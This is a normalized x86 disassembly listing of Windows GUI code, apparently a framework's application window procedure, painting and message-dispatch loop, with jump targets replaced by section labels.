mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x170 ]
push eax
call DefWindowProcW
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_481330
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x170 ]
push eax
call BeginPaint
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_481ac0
push eax
push 0x0
push 0x0
push ebx
call DrawIcon
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x170 ]
push eax
call EndPaint
pop ebx
mov esp ebp
pop ebp
retn
sub_481380
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push j_sub_4488a4#7
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xac ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4811f4
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx ]
mov eax ebx
cmp eax 0x53
jg r-xdata
inc ebx
xor esi esi
cmp eax 0xb017
jg r-xdata
je r-xdata
inc esi
dec ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0xb020
jg r-xdata
je r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov edx [ ebp - 0x8 ]
movzx edx [ edx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_482990
jmp r-xdata
cmp eax 0x11
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xac ]
mov edx esi
call sub_4246e8
mov edi eax
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x4 ]
call [ edi ]
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub eax 0xb031
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
test eax eax
je r-xdata
cmp eax 0xb000
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0x1c
jg r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
add eax 0xfffffff2
sub eax 0x2
jb r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
sub eax 0xb01a
je r-xdata
mov ebx eax
mov eax ebx
call sub_496868
test eax eax
je r-xdata
sub eax 0xb001
je r-xdata
je r-xdata
sub eax 0x1d
je r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
cmp eax 0x10
ja r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xb4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xb4 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov eax [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_483c44
and eax 0x7f
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_4822d4
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_482274
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_4769b0
test eax eax
jne r-xdata
sub eax 0x5
je r-xdata
mov eax ebx
call sub_496868
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
push eax
call GetLastActivePopup
mov edx [ ebp - 0x4 ]
mov [ edx + 0xd0 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x13a ] 0x0
je r-xdata
sub eax 0x15
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x142 ] 0x0
je r-xdata
sub eax 0x112
je r-xdata
mov eax [ rw-data ]
call sub_480340
push ebp
call sub_4812f0
pop ecx
jmp r-xdata
sub eax 0x1a
je r-xdata
push ebp
call sub_4812f0
pop ecx
mov eax [ ebp - 0x8 ]
mov esi eax
lea edi [ ebp - 0x28 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ ebp - 0x24 ] 0x1
sbb eax eax
inc eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0xa1 ] al
test al al
je r-xdata
sub eax 0x14
je r-xdata
push ebp
call sub_4812f0
pop ecx
jmp [ eax * 4 + jump_table_481424 ]
call GetFocus
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x170 ]
jne r-xdata
jmp r-xdata
mov eax ebx
call sub_496868
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_48201c
test al al
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov ebx [ eax + 0x40 ]
test ebx ebx
je r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x144 ]
call [ ebx + 0x140 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
sub eax 0xf020
je r-xdata
add eax 0xffffffe0
sub eax 0x7
jb r-xdata
mov eax [ ebp - 0x4 ]
call sub_481ac0
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_480e98
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
push eax
call PostMessageW
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xcf ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x27
push ebp
call sub_4812f0
pop ecx
jmp r-xdata
sub eax 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_4769b0
test eax eax
je r-xdata
push 0x0
push 0x0
push 0xb01a
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
push eax
call PostMessageW
push ebp
call sub_4812f0
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi eax
lea edi [ ebp - 0x38 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ ebp - 0x34 ] 0x0
je r-xdata
xor eax eax
call sub_42d9b0
jmp r-xdata
xor eax eax
call sub_476cdc
test eax eax
je r-xdata
mov [ rw-data ] 0x0
call GetFocus
mov esi eax
mov eax ebx
call sub_496868
push eax
call SetFocus
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax ebx
call sub_48f2b0
push esi
call SetFocus
mov [ rw-data ] 0x1
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xd0 ] edx
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0xcf ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_481adc
jmp r-xdata
sub eax 0x100
je r-xdata
mov esi [ ebp - 0x8 ]
mov esi [ esi + 0x8 ]
push esi
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
add ebx 0xbc00
push ebx
mov eax [ ebp - 0x8 ]
push esi
call SendMessageW
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x1e1
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_480ef8
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
push eax
call PostMessageW
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov esi eax
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ ebp - 0x44 ] 0x0
je r-xdata
sub eax 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x30 ] 0x1
jmp r-xdata
call sub_47dde4
jmp r-xdata
push ebp
call sub_4812f0
pop ecx
jmp r-xdata
push ebp
call sub_481330
pop ecx
jmp r-xdata
push ebp
call sub_4812f0
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xb0 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push eax
call SetFocus
jmp r-xdata
mov eax ebx
call sub_496868
push eax
call IsWindowEnabled
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_481be0
jmp r-xdata
jmp r-xdata
call sub_44c2c8
call sub_44c430
mov [ ebp - 0x18 ] 0xb051
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
call sub_47f684
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x30 ] 0x0
call sub_44917c
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_49bf08
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_481274
push ebp
call sub_4812f0
pop ecx
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_480ea0
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push ebp
call sub_4812f0
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_480ef8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xb0 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_496868
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0xd0 ]
je r-xdata
push ebp
call sub_4812f0
pop ecx
jmp r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_476b80
mov edx [ ebp - 0x4 ]
mov [ edx + 0xb0 ] eax
call sub_476c44
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xb0 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xd0 ]
push eax
call SetFocus
mov edx esi
mov eax [ rw-data ]
call sub_47f670
lea edx [ ebp - 0x18 ]
call sub_492554
inc esi
dec ebx
jne r-xdata
jmp r-xdata
sub_481adc
push ebx
mov ebx eax
mov eax [ ebx + 0x170 ]
call sub_4769b0
test eax eax
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_480e98
cmp [ ebx + 0xcf ] 0x0
jne r-xdata
mov [ ebx + 0x30 ] 0x1
xor edx edx
mov eax ebx
call sub_481058
cmp [ ebx + 0xcf ] 0x0
je r-xdata
mov eax [ ebx + 0x170 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x40 ] 0x0
je r-xdata
mov eax [ ebx + 0x40 ]
test eax eax
je r-xdata
mov edx 0x6
mov eax [ ebx + 0x170 ]
call sub_4805cc
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
mov [ ebx + 0xd8 ] 0x1
jmp r-xdata
mov dl 0x1
call sub_47af94
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x14c ]
call [ ebx + 0x148 ]
mov eax [ ebx + 0x40 ]
call sub_496868
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x40 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
cmp [ ebx + 0x14a ] 0x0
je r-xdata
push 0x40
push 0x0
mov eax [ ebx + 0x40 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebx + 0x40 ]
call sub_479188
push eax
mov eax [ ebx + 0x40 ]
call sub_479168
push eax
mov eax [ ebx + 0x40 ]
call sub_496868
push eax
mov eax [ ebx + 0x170 ]
push eax
call SetWindowPos
push 0x0
push 0xf020
push 0x112
mov eax [ ebx + 0x170 ]
push eax
call DefWindowProcW
jmp r-xdata
sub_481be0
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x170 ]
call sub_4769b0
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x30 ] 0x0
mov eax [ ebx + 0x170 ]
push eax
call SetActiveWindow
mov esi [ ebx + 0x40 ]
test esi esi
je r-xdata
mov eax [ ebx + 0x40 ]
test eax eax
je r-xdata
cmp [ ebx + 0xcf ] 0x0
je r-xdata
mov eax ebx
call sub_480ef8
mov dl 0x1
mov eax ebx
call sub_481058
mov eax [ rw-data ]
mov esi [ eax + 0x5c ]
test esi esi
je r-xdata
cmp [ eax + 0x283 ] 0x1
jne r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
push 0x9
mov eax esi
call sub_496868
push eax
call ShowWindow
jmp r-xdata
cmp [ ebx + 0x152 ] 0x0
je r-xdata
mov eax esi
call sub_496868
push eax
call SetFocus
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebx + 0x40 ]
call sub_496868
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x40 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x154 ]
call [ ebx + 0x150 ]
xor edx edx
call sub_47af94
mov eax [ ebx + 0x40 ]
call sub_47df8c
mov edx 0x9
mov eax [ ebx + 0x170 ]
call sub_4805cc
push 0x0
push 0xf120
push 0x112
mov eax [ ebx + 0x170 ]
push eax
call DefWindowProcW
jmp r-xdata
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
push 0x40
push 0x0
push 0x0
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
push eax
push 0x0
mov eax [ ebx + 0x170 ]
push eax
call SetWindowPos
adc eax 0x0
sub_481d20
push ebx
push esi
mov ebx eax
cmp [ ebx + 0xcf ] 0x0
je r-xdata
mov eax [ ebx + 0x170 ]
cmp [ ebx + 0x40 ] 0x0
je r-xdata
pop esi
pop ebx
retn
push eax
call GetLastActivePopup
mov esi eax
test esi esi
je r-xdata
mov eax [ ebx + 0x40 ]
call sub_496868
jmp r-xdata
cmp esi [ ebx + 0x170 ]
je r-xdata
test eax eax
je r-xdata
push esi
call IsWindowVisible
test eax eax
je r-xdata
push esi
call IsWindowEnabled
test eax eax
je r-xdata
push esi
call SetForegroundWindow
sub_481d78
push ebx
push esi
add esp 0xfffffdfc
mov esi edx
mov ebx eax
cmp [ ebx + 0xa8 ] 0x0
je r-xdata
mov eax esi
mov edx [ ebx + 0x88 ]
call sub_449d2c
cmp [ ebx + 0xcf ] 0x0
jne r-xdata
push 0x100
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x170 ]
push eax
call GetWindowTextW
mov ecx eax
mov edx esp
mov eax esi
call sub_449e68
mov eax [ esi ]
mov [ esp + 0x200 ] eax
mov eax [ esp + 0x200 ]
test eax eax
je r-xdata
test eax eax
jne r-xdata
sub eax 0x4
mov eax [ eax ]
add esp 0x204
pop esi
pop ebx
retn
mov eax esi
mov edx [ ebx + 0x88 ]
call sub_449d2c
jmp r-xdata
sub_481dfc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x88 ]
mov edx esi
call j_sub_44a294
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0xa8 ] 0x0
je r-xdata
lea eax [ ebx + 0x88 ]
mov edx esi
call sub_449d2c
cmp [ ebx + 0xcf ] 0x0
je r-xdata
mov eax esi
call sub_449db8
push eax
mov eax [ ebx + 0x170 ]
push eax
call SetWindowTextW
push 0x0
mov eax [ ebx + 0x170 ]
push eax
call SetWindowTextW
jmp r-xdata
sub_481e58
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
cmp [ ebx + 0xb4 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi ]
push eax
call IsWindowUnicode
test eax eax
je r-xdata
push esi
mov eax [ ebx + 0xb4 ]
push eax
call IsDialogMessageA
cmp eax 0x1
sbb eax eax
inc eax
push esi
mov eax [ ebx + 0xb4 ]
push eax
call IsDialogMessageW
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
sub_481ea0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0x40 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x287 ] 0x2
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x64 ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x64 ]
cmp [ edx + 0x287 ] 0x1
jne r-xdata
push edi
mov eax [ esi + 0x36c ]
push eax
call TranslateMDISysAccel
cmp eax 0x1
sbb eax eax
inc eax
sub_481ef0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov edi eax
xor ebx ebx
mov eax [ esi + 0x4 ]
cmp eax 0x100
jb r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp eax 0x109
ja r-xdata
call GetCapture
mov ebp eax
test ebp ebp
jne r-xdata
push esp
push ebp
call GetWindowThreadProcessId
lea eax [ esp + 0x4 ]
push eax
mov eax [ edi + 0x170 ]
push eax
call GetWindowThreadProcessId
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
jne r-xdata
mov ebp [ esi ]
mov eax [ edi + 0x40 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageW
test eax eax
je r-xdata
mov eax ebp
call sub_48a768
test al al
jne r-xdata
cmp ebp [ eax + 0x36c ]
jne r-xdata
mov bl 0x1
test ebp ebp
jne r-xdata
test ebp ebp
jne r-xdata
call sub_496868
mov ebp eax
jmp r-xdata
push ebp
call IsWindowUnicode
test eax eax
je r-xdata
mov ebp [ esi ]
push ebp
call GetParent
mov ebp eax
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageW
test eax eax
je r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x1
jmp r-xdata
sub_481fe8
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebp eax
xor ebx ebx
mov esi [ ebp + 0x80 ]
test esi esi
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xe8 ]
test al al
je r-xdata
mov eax ebp
call sub_483438
sub_48201c
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov ebx eax
mov [ esp ] 0x0
cmp [ ebx + 0x15a ] 0x0
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov ecx esp
mov edx ebp
mov eax [ ebx + 0x15c ]
call [ ebx + 0x158 ]
mov al 0x1
mov edi [ ebx + 0x40 ]
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
mov eax edi
call sub_496868
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov [ esp ] al
movzx eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebp
mov eax [ ebx + 0x40 ]
mov si 0xffa4
call sub_4483f8
test al al
jne r-xdata
sub_482088
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
mov eax [ edx ]
sub eax 0x11
je r-xdata
mov [ edx + 0xc ] 0x1
sub eax 0xb038
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push esi
mov esi edx
lea edi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov eax [ esi + 0xc8 ]
call sub_44af30
test eax eax
jl r-xdata
inc eax
xor ebx ebx
inc ebx
dec eax
jne r-xdata
mov edx [ esi + 0xc8 ]
cmp [ edx + edi * 4 + 0x4 ] 0x0
je r-xdata
lea edi [ ebx + ebx * 2 ]
mov edx [ esi + 0xc8 ]
mov edx [ edx + edi * 4 ]
cmp edx [ esp + 0x4 ]
jne r-xdata
jmp r-xdata
mov eax [ esi + 0xc8 ]
cmp [ eax + edi * 4 + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0xc8 ]
mov eax [ eax + edi * 4 + 0x4 ]
call sub_496844
mov eax [ esi + 0xc8 ]
mov eax [ eax + edi * 4 + 0x4 ]
call sub_4930c8
jmp r-xdata
mov eax [ esi + 0xc8 ]
mov eax [ eax + edi * 4 + 0x4 ]
mov edx [ esp + 0x8 ]
call sub_47e030
jmp r-xdata
sub_48213c
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
xor ebx ebx
push 0x0
push 0x0
push 0x0
push 0x0
push edi
call PeekMessageW
test eax eax
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp [ edi ]
test ebp ebp
je r-xdata
mov al 0x1
push ebp
call IsWindowUnicode
test eax eax
jne r-xdata
push 0x1
push 0x0
push 0x0
push 0x0
push edi
call PeekMessageA
cmp eax 0x1
sbb eax eax
inc eax
push 0x1
push 0x0
push 0x0
push 0x0
push edi
call PeekMessageW
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
xor eax eax
jmp r-xdata
mov bl 0x1
cmp [ edi + 0x4 ] 0x12
je r-xdata
test al al
je r-xdata
mov [ esp + 0x1 ] al
cmp [ esp + 0x1 ] 0x0
je r-xdata
mov [ esi + 0xa0 ] 0x1
mov [ esp ] 0x0
cmp [ esi + 0x10a ] 0x0
je r-xdata
mov edx edi
mov eax esi
call sub_483dd4
test al al
jne r-xdata
mov ecx esp
mov edx edi
mov eax [ esi + 0x10c ]
call [ esi + 0x108 ]
mov edx edi
mov eax esi
call sub_481fe8
test al al
jne r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_481ea0
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_481ef0
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_481e58
test al al
jne r-xdata
push edi
call TranslateMessage
cmp [ esp + 0x1 ] 0x0
je r-xdata
push edi
call DispatchMessageA
jmp r-xdata
push edi
call DispatchMessageW
jmp r-xdata
sub_482250
push ebx
add esp 0xffffffe4
mov ebx eax
mov edx esp
mov eax ebx
call sub_48213c
test al al
jne r-xdata
add esp 0x1c
pop ebx
retn
mov edx esp
mov eax ebx
call sub_482e14
sub_482274
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0xa8 ] 0x0
jne r-xdata
mov eax [ ebx + 0xac ]
call sub_4246c8
mov eax 0x8
call sub_44748c
mov edx [ ebp + 0x8 ]
mov [ eax ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov edx eax
mov eax [ ebx + 0xac ]
call sub_424590
mov eax [ ebx + 0x170 ]
test eax eax
je r-xdata
pop ebx
pop ebp
retn 0x8
lea edx [ ebp + 0x8 ]
push edx
push 0x0
push 0xb020
push eax
call SendMessageW
jmp r-xdata
sub_4822d4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0xa8 ] 0x0
jne r-xdata
mov eax [ ebx + 0xac ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebx + 0x170 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
inc edi
xor esi esi
lea edx [ ebp + 0x8 ]
push edx
push 0x1
push 0xb020
push eax
call SendMessageW
jmp r-xdata
inc esi
dec edi
jne r-xdata
mov edx [ ebp + 0xc ]
cmp edx [ eax + 0x4 ]
jne r-xdata
mov edx esi
mov eax [ ebx + 0xac ]
call sub_4246e8
mov edx [ eax ]
cmp edx [ ebp + 0x8 ]
jne r-xdata
mov edx 0x8
call sub_4474a8
mov edx esi
mov eax [ ebx + 0xac ]
call sub_4245dc
jmp r-xdata
sub_48236c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x40 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov edx [ r-xdata ]
mov eax ebx
call sub_448428
test al al
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0xcd ] al
xor eax eax
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_4824ac
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax ebx
call [ eax - 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov [ eax ] edx
xor eax eax
push ebp
push sub_4823ef
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp - 0x4 ]
or edx 0xffffffff
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x40 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4824b3
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
retn
mov eax [ ebp - 0xc ]
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov ebx [ ebp - 0xc ]
mov eax ebx
call sub_496844
mov eax [ ebp - 0x4 ]
mov [ eax + 0x40 ] ebx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xcf ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0x360 ] 0x0
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0xcf ]
xor al 0x1
mov ecx eax
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_476a30
push 0xffffffec
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x170 ]
push ebx
call GetWindowLongW
or eax 0x8000000
push eax
push 0xffffffec
push ebx
call SetWindowLongW
sub_4824bc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa9 ] 0x1
xor edx edx
push ebp
push sub_4825cd
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax sub_476af4
call sub_434bdc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4825d4
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa9 ] 0x0
retn
mov edx [ rw-data ]
mov edx [ edx ]
sub edx 0x3
je r-xdata
mov dl 0x2
call sub_47af94
sub edx 0x4
jne r-xdata
xor eax eax
push ebp
push sub_482594
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_482250
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
cmp [ eax + 0x283 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
